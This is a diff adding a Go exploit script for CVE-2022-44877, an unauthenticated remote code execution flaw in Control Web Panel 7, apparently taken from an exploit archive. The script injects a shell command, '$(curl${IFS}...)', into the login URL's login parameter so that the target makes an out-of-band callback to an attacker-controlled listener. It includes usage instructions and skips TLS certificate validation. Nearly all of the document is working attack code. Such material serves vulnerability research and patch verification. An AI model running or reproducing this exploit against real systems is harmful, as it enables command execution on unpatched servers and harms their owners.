@@ -1,0 +1,72 @@
+id: 38485
+date: 04/05/2023
+title: Control Web Panel 7 (CWP7) v0.9.8.1147 - Remote Code Execution Exploit
+author: Mayank Deshmukh
+cves: CVE-2022-44877
+
+// Exploit Title: Control Web Panel 7 (CWP7) v0.9.8.1147 -  Remote Code Execution (RCE)
+// Exploit Author: Mayank Deshmukh
+// Vendor Homepage: https://centos-webpanel.com/
+// Affected Versions: version < 0.9.8.1147
+// Tested on: Kali Linux
+// CVE : CVE-2022-44877
+// Github POC: https://github.com/ColdFusionX/CVE-2022-44877-CWP7
+
+// Exploit Usage : go run exploit.go -u https://127.0.0.1:2030 -i 127.0.0.1:8020
+
+package main
+
+import (
+    "bytes"
+    "crypto/tls"
+    "fmt"
+    "net/http"
+    "flag"
+    "time"
+)
+
+func main() {
+
+    var host,call string
+    flag.StringVar(&host, "u", "", "Control Web Panel (CWP) URL (ex. https://127.0.0.1:2030)")
+    flag.StringVar(&call, "i", "", "Listener IP:PORT (ex. 127.0.0.1:8020)")
+
+    flag.Parse()
+
+    banner := `
+-= Control Web Panel 7 (CWP7) Remote Code Execution (RCE) (CVE-2022-44877) =-
+- by Mayank Deshmukh (ColdFusionX)
+
+`
+     fmt.Printf(banner)
+     fmt.Println("[*] Triggering cURL command")
+
+     fmt.Println("[*] Open Listener on " + call + "")
+
+    //Skip certificate validation
+    tr := &http.Transport{
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+    }
+    client := &http.Client{Transport: tr}
+
+    // Request URL
+    url := host + "/login/index.php?login=$(curl${IFS}" + call + ")"
+
+    // Request body
+    body := bytes.NewBuffer([]byte("username=root&password=cfx&commit=Login"))
+
+    // Create HTTP client and send POST request
+    req, err := http.NewRequest("POST", url, body)
+    req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+    resp, err := client.Do(req)
+    if err != nil {
+        fmt.Println("Error sending request:", err)
+        return
+    }
+    time.Sleep(2 * time.Second)
+
+    defer resp.Body.Close()
+    fmt.Println("\n[*] Check Listener for OOB callback")
+}
+
+#  0day.today [2023-04-19]  #
